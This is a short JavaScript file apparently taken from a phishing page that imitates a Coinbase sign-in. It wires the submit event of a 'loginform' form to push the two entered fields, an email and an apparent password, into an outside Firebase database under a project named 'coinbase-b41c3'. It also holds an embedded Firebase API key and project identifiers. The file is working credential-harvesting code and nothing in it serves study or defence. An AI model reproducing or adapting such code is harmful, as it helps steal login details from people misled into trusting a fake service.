const firebaseConfig = {
    apiKey: "AIzaSyBLVCyzfG-p6shWMZ-ygHCScJG4-TKetyY",
    authDomain: "coinbase-b41c3.firebaseapp.com",
    databaseURL: "https://coinbase-b41c3-default-rtdb.firebaseio.com",
    projectId: "coinbase-b41c3",
    storageBucket: "coinbase-b41c3.appspot.com",
    messagingSenderId: "496231056686",
    appId: "1:496231056686:web:b615ba98e0eeb4344be6bf"
  };

  firebase.initializeApp(firebaseConfig);
  
  
  var loginformDB = firebase.database().ref("loginform");
  document.getElementById("loginform").addEventListener("submit", submitForm);


  function submitForm(e){
    e.preventDefault();
var email = getElementByVal("email");
var email1 = getElementByVal("email1");
  
 saveMessages(email, email1);
  //   enable alert
document.querySelector(".alert").style.display = "block";

//   remove the alert
setTimeout(() => {
document.querySelector(".alert").style.display = "none";
}, 3000);

//   reset the form
document.getElementById("contactForm").reset();

}

const saveMessages = (email, email1) => {
    var newLoginForm = loginformDB.push();
    newLoginForm.set({
        email: email,
        email1: email1,
    })
};
  const getElementByVal = (id) => {
    return document.getElementById(id).value;
  };